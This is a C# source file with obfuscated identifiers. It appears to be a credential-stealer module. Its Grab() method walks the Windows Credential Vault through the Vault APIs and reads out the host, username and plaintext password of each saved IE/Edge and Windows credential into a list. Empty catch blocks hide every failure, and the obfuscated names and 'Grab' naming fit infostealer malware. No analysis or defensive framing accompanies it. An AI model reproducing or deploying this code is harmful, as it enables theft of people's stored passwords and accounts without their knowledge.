using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;
using C6Zy;
using UHyll;

namespace rk937aHHc
{
	public class IE_Edge : EtbH
	{
		public IE_Edge()
		{
			this.aQZ = "IE/Edge";
		}

		public string aQZ { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();

            try
            {
                Version version = Environment.OSVersion.Version;
                int major = version.Major;
                int minor = version.Minor;

                Type vaultItemType = (major >= 6 && minor >= 2) ? typeof(FNu.qXj) : typeof(FNu.Vca7szkAbA);

                int vaultCount = 0;
                IntPtr vaultPtr = IntPtr.Zero;
                int res = FNu.VaultEnumerateVaults(0, ref vaultCount, ref vaultPtr);
                if (res != 0) return list;

                IntPtr currentPtr = vaultPtr;

                Dictionary<Guid, string> vaultNames = new Dictionary<Guid, string>
        {
            { new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note" },
            { new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential" },
            { new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector" },
            { new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials" },
            { new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials" },
            { new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential" },
            { new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential" },
            { new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential" },
            { new Guid("00000000-0000-0000-0000-000000000000"), null }
        };

                for (int i = 0; i < vaultCount; i++)
                {
                    Guid vaultGuid = (Guid)Marshal.PtrToStructure(currentPtr, typeof(Guid));
                    currentPtr = IntPtr.Add(currentPtr, Marshal.SizeOf(typeof(Guid)));

                    if (!vaultNames.ContainsKey(vaultGuid)) vaultGuid.ToString();

                    IntPtr vaultHandle = IntPtr.Zero;
                    if (FNu.VaultOpenVault(ref vaultGuid, 0U, ref vaultHandle) != 0) continue;

                    int itemCount = 0;
                    IntPtr itemsPtr = IntPtr.Zero;
                    if (FNu.VaultEnumerateItems(vaultHandle, 512, ref itemCount, ref itemsPtr) != 0) continue;

                    IntPtr currentItemPtr = itemsPtr;

                    for (int j = 0; j < itemCount; j++)
                    {
                        try
                        {
                            object vaultItem = Marshal.PtrToStructure(currentItemPtr, vaultItemType);

                            currentItemPtr = (IntPtr)((IntPtr.Size == 8)
                                ? currentItemPtr.ToInt64() + Marshal.SizeOf(vaultItemType)
                                : currentItemPtr.ToInt32() + Marshal.SizeOf(vaultItemType) - 8);

                            Guid schemaId = new Guid(vaultItem.GetType().GetField("SchemaId").GetValue(vaultItem).ToString());
                            IntPtr resourcePtr = (IntPtr)vaultItem.GetType().GetField("pResourceElement").GetValue(vaultItem);
                            IntPtr identityPtr = (IntPtr)vaultItem.GetType().GetField("pIdentityElement").GetValue(vaultItem);
                            IntPtr packageSidPtr = IntPtr.Zero;

                            int getItemResult;
                            if (major >= 6 && minor >= 2)
                            {
                                packageSidPtr = (IntPtr)vaultItem.GetType().GetField("pPackageSid").GetValue(vaultItem);
                                getItemResult = FNu.VaultGetItem_WIN8(vaultHandle, ref schemaId, resourcePtr, identityPtr, packageSidPtr, IntPtr.Zero, 0, ref itemsPtr);
                            }
                            else
                            {
                                getItemResult = FNu.VaultGetItem_WIN7(vaultHandle, ref schemaId, resourcePtr, identityPtr, IntPtr.Zero, 0, ref itemsPtr);
                            }

                            if (getItemResult != 0) continue;

                            object itemData = Marshal.PtrToStructure(itemsPtr, vaultItemType);
                            IntPtr authPtr = (IntPtr)itemData.GetType().GetField("pAuthenticatorElement").GetValue(itemData);

                            if (packageSidPtr != IntPtr.Zero) FNu.PlKuS(packageSidPtr);

                            string host = (string)FNu.PlKuS(resourcePtr);
                            string username = (string)FNu.PlKuS(identityPtr);
                            string password = (string)FNu.PlKuS(authPtr);

                            list.Add(new WTitxI2m
                            {
                                data1 = host,
                                data2 = username,
                                data3 = password,
                                data4 = "IE/Edge"
                            });
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {
            }

            return list;
        }
    }
}
